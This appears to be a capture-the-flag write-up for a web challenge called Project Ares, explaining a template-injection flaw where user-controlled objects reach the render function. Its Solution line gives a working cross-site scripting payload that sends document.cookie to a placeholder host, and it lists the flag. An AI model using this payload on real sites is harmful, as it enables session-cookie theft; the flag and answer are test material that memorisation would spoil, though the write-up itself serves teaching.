# Project Ares

### Challenge Details

I think someone chose the wrong Greek god to base a website on

### Key Concepts

Passing an object with user controlled properties directly to the render function is unsafe

### Solution

Add the parameters `cache=&doctype=><script>fetch(HOOK_URL+document.cookie)</script>` to the call to /signup

### Note to admins

When initially starting the challenge (or after restarting the Docker) please make a new profile with any random content in order to instantiate the template cache, otherwise someone's payload might pollute the template cache and make it show up for everyone

### Flag
`grey{dont_pAsS_uS3r_oBj3C7s_To_R3nder_fc4fc28280f702d24b0243c1571f96f1}`